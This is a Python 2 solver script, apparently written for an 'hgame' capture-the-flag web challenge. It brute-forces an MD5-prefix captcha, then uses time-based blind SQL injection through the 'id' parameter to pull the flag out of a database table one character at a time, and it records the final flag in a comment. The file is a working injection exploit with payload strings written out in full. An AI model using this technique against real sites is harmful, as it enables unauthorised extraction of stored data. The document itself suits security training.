# -*-coding:utf-8-*-
 
import requests
import time
import hashlib
import re
 
def get_code(URL):
             headers = {"Host": "118.89.111.179:3001",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                        "Accept-Encoding": "gzip, deflate",
                        "Cookie": "PHPSESSID=6muuot38dustcvi9ib6tf31h8m",
                        "Connection": "keep-alive",
                        "Upgrade-Insecure-Requests":"1"
                        }
             r = requests.get(URL,headers=headers)
             mes = re.findall(r"=== (.+?)<br>",r.text)
             code = "".join(mes)
             return code
def md5(s):
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()

def get_md5(code):
    for i in range(10000,999999):
        if md5(str(i))[0:4]  == str(code):
            return(str(i))
flag = ""
payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.{}-ABCDEFGHIJKLMNOPQRSTUVWXYZ'
print("Start")
for j in range(1,38):
    for i in payloads:
            print "i:"+str(i)
            starttime = time.time()#记录当前时间
            url1 = "http://118.89.111.179:3001/?id=1"
            print "code:"+get_md5(get_code(url1))
            url2 = "http://118.89.111.179:3001/?code="+get_md5(get_code(url1))+"&id=sleep(if(ascii(substr((select fL4444Ag from F11111114G limit 0,1),"+str(j)+",1))="+str(ord(i))+",0,1))"
            print "URL:"+url2
            headers = {"Host": "118.89.111.179:3001",
                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                       "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                       "Accept-Encoding": "gzip, deflate",
                       "Cookie": "PHPSESSID=6muuot38dustcvi9ib6tf31h8m",
                       "Connection": "keep-alive",
                       "Upgrade-Insecure-Requests":"1"
                       }
            res = requests.get(url2, headers=headers)
            if time.time() - starttime > 1:
                starttime2 = time.time()
                res = requests.get(url2, headers=headers)                
            else:
                flag += i
                print "flag:"+flag
                break
                if (len(flag)>37):#已知flag长度38
                    break
#最终flag:hgame{sqli_1s_s0_s0_s0_s0_interesting}                

        
